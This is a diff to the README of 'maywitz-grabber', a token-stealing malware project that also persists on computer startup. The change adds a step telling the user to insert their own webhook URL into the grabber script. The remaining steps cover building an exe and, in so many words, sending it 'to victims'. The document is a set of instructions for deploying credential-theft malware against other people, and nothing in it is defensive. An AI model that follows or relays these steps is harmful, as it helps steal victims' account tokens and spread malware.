@@ -33,9 +33,10 @@ Yes, this token grabber attempts to add itself so it's run on computer startup, 
 
 1. Download the repository as a zip
 2. Extract the contents of the zip file into a seperate folder
-3. Run setup.bat
-4. Enter a name for your token logger
-5. Open the dist folder to find your compiled exe file
-6. Send the file to victims
+3. Change the webhook url in maywitz-grabber.py to your webhook url
+4. Run setup.bat
+5. Enter a name for your token logger
+6. Open the dist folder to find your compiled exe file
+7. Send the file to victims
 
 Make sure you have [python](https://python.org) installed!
